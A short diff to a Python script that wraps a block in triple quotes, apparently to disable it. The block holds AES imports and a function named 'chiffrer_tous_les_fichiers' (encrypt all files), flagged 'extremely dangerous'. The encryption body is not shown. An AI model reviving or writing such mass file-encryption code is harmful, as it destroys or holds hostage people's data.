@@ -39,6 +39,7 @@ if __name__ == "__main__":
 '''
 # Extrement dangereux ! Extrem caution !! 
 
+'''
 import os 
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad 
@@ -76,3 +77,4 @@ def chiffrer_tous_les_fichiers():
 
 if __name__ == "__main__":
     chiffrer_tous_les_fichiers()
+'''
